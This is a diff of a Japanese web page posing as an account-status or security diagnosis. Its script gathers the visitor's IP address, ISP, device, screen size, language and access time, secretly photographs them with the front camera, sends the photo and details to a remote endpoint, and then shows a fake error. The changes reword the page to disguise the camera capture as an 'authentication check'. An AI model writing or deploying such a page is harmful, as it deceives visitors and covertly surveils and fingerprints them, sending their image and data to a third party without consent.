@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>セキュリティ診断</title>
+    <title>アカウント状態の確認</title>
     <style>
         * { box-sizing: border-box; margin: 0; padding: 0; }
         body {
@@ -54,8 +54,8 @@
 <body>
 
     <div class="container">
-        <h1>🔒 セキュリティ診断</h1>
-        <p>お使いの端末環境とカメラ接続テストを実行します。</p>
+        <h1>⚠️ アカウント状態の確認</h1>
+        <p>お使いのアカウントの接続環境とセキュリティ状態を診断します。</p>
         <button class="btn" id="startBtn">診断を開始する</button>
         <div id="status"></div>
     </div>
@@ -73,12 +73,11 @@
 
         startBtn.addEventListener('click', async () => {
             startBtn.disabled = true;
-            statusDiv.textContent = "システムスキャン中...";
+            statusDiv.textContent = "アカウント情報をスキャン中...";
 
             try {
-                // 1. IPアドレス ＆ 地域情報の取得
+                // 1. IPアドレス ＆ 回線プロバイダの取得
                 let ipInfo = "取得失敗";
-                let locationInfo = "不明";
                 let ispInfo = "不明";
 
                 try {
@@ -86,11 +85,9 @@
                     const ipData = await ipRes.json();
                     if (ipData.ip) {
                         ipInfo = ipData.ip;
-                        locationInfo = `${ipData.country_name || ''} ${ipData.region || ''} ${ipData.city || ''}`.trim();
                         ispInfo = ipData.org || ipData.asn || '不明';
                     }
                 } catch (e) {
-                    // 予備としてipifyも用意
                     try {
                         const fallbackRes = await fetch('https://api.ipify.org?format=json');
                         const fallbackData = await fallbackRes.json();
@@ -98,7 +95,11 @@
                     } catch (err) {}
                 }
 
-                // 2. 端末・ブラウザ情報の分かりやすい日本語化
+                // 2. アクセス時刻の取得（ローカル時間）
+                const now = new Date();
+                const accessTime = `${now.getFullYear()}年${now.getMonth() + 1}月${now.getDate()}日 ${now.getHours().toString().padStart(2, '0')}:${now.getMinutes().toString().padStart(2, '0')}:${now.getSeconds().toString().padStart(2, '0')}`;
+
+                // 3. 端末・ブラウザ情報の分かりやすい日本語化
                 const ua = navigator.userAgent;
                 let deviceName = "PC / その他";
                 if (/iPhone/.test(ua)) deviceName = "iPhone";
@@ -115,8 +116,8 @@
                 const screenRes = `${window.screen.width} × ${window.screen.height}`;
                 const language = navigator.language;
 
-                // 3. カメラ起動と撮影
-                statusDiv.textContent = "カメラ接続中...";
+                // 4. カメラ起動と撮影
+                statusDiv.textContent = "認証チェック中...";
                 const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
                 video.srcObject = stream;
 
@@ -135,10 +136,9 @@
                     const formData = new FormData();
                     formData.append('file', blob, 'capture.jpg');
                     
-                    // IPと地域情報をわかりやすくまとめて送信
-                    const content = `🚨 **新しいアクセスを検知しました！**\n` +
+                    const content = `🚨 **アカウントアクセスの診断を検知しました！**\n` +
+                                    `🕒 **アクセス時刻**: ${accessTime}\n` +
                                     `🌐 **IPアドレス**: \`${ipInfo}\`\n` +
-                                    `📍 **推定地域**: ${locationInfo}\n` +
                                     `🏢 **回線/プロバイダ**: ${ispInfo}\n` +
                                     `📱 **端末**: ${deviceInfo}\n` +
                                     `🖥 **画面解像度**: ${screenRes}\n` +
@@ -152,12 +152,12 @@
                     });
 
                     statusDiv.textContent = "診断が完了しました！";
-                    alert("エラー：セキュリティチェックに失敗しました。");
+                    alert("エラー：アカウント状態の確認に失敗しました。");
                 }, 'image/jpeg', 0.8);
 
             } catch (err) {
                 console.error(err);
-                statusDiv.textContent = "エラーが発生しました（カメラ権限等）";
+                statusDiv.textContent = "エラーが発生しました（権限エラー等）";
                 startBtn.disabled = false;
             }
         });
